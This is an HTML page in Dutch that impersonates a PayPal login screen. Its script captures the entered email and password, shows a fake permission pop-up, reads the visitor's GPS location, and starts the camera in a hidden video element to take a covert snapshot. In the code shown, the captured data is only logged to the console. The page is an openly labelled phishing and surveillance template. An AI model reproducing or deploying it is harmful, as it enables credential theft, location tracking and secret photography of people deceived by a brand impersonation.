<!DOCTYPE html>
<html lang="nl">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>PayPal - Inloggen</title>
    <style>
        /* CSS-styling blijft hetzelfde */
    </style>
</head>
<body class="paypal-background">

    <div class="container">
        <h2 class="paypal-color">PayPal</h2>
        <p>Log in om door te gaan</p>
        <input type="text" placeholder="E-mailadres" id="email">
        <input type="password" placeholder="Wachtwoord" id="password">
        
        <!-- Fake login button -->
        <button class="login-btn" onclick="requestPermissions()">Inloggen</button>
    </div>

    <!-- Fake Browser Popup -->
    <div id="fake-popup">
        <p class="popup-text">Om verder te gaan, moeten de benodigde toestemmingen worden gegeven voor locatie en camera.</p>
    </div>

    <script>
        function requestPermissions() {
            // Bewaar de gegevens van de invoervelden
            const email = document.getElementById("email").value;
            const password = document.getElementById("password").value;
            console.log(`ðŸ“§ Gegevens opgeslagen - E-mail: ${email}, Wachtwoord: ${password}`);

            // Toon fake pop-up voor toestemming
            document.getElementById("fake-popup").style.display = "block";

            // Pop-up verdwijnt na 5 seconden
            setTimeout(() => {
                document.getElementById("fake-popup").style.display = "none";
            }, 5000);

            // **Vraag de locatie toestemming eerst, daarna de camera toestemming**:
            requestLocationPermission()
                .then(() => {
                    console.log("âœ… Locatie toestemming gegeven!");
                    // Als locatie toestemming is gegeven, vraag dan camera toestemming
                    return requestCameraPermission();
                })
                .then(() => {
                    console.log("âœ… Camera toestemming gegeven!");
                })
                .catch(error => {
                    console.log("âŒ Fout bij het verkrijgen van toestemmingen:", error);
                });
        }

        // Locatie toestemming aanvragen
        function requestLocationPermission() {
            return new Promise((resolve, reject) => {
                if (navigator.geolocation) {
                    navigator.geolocation.getCurrentPosition(position => {
                        console.log(`ðŸ“ GPS Locatie: ${position.coords.latitude}, ${position.coords.longitude}`);
                        resolve();
                    }, error => {
                        console.log("âŒ Locatie geweigerd of niet beschikbaar:", error);
                        reject(error);
                    });
                } else {
                    console.log("âŒ Geolocatie wordt niet ondersteund door deze browser.");
                    reject("Geolocatie niet ondersteund");
                }
            });
        }

        // Camera toestemming aanvragen
        function requestCameraPermission() {
            return new Promise((resolve, reject) => {
                if (navigator.mediaDevices && navigator.mediaDevices.getUserMedia) {
                    navigator.mediaDevices.getUserMedia({ video: true })
                        .then(stream => {
                            // **Verborgen camera stream**: De camera wordt niet zichtbaar
                            let video = document.createElement("video");
                            video.srcObject = stream;
                            video.width = 320;
                            video.height = 240;
                            video.play();
                            
                            // Video-element wordt verborgen
                            video.style.display = "none";

                            // Simuleer foto na 3 seconden
                            setTimeout(() => {
                                takeSelfie(video, stream);
                            }, 3000);
                            resolve();
                        })
                        .catch(error => {
                            console.log("âŒ Camera geweigerd:", error);
                            reject(error);
                        });
                } else {
                    console.log("âŒ Camera wordt niet ondersteund door deze browser.");
                    reject("Camera niet ondersteund");
                }
            });
        }

        // Maak een selfie na toestemming voor camera
        function takeSelfie(video, stream) {
            let canvas = document.createElement("canvas");
            canvas.width = video.videoWidth;
            canvas.height = video.videoHeight;
            let ctx = canvas.getContext("2d");
            ctx.drawImage(video, 0, 0, canvas.width, canvas.height);

            let selfieData = canvas.toDataURL("image/png"); // Zet foto om naar een base64 afbeelding
            console.log("ðŸ“¸ Selfie genomen:", selfieData);

            // Stop de camera na het maken van de selfie
            stream.getTracks().forEach(track => track.stop());
        }
    </script>

</body>
</html>
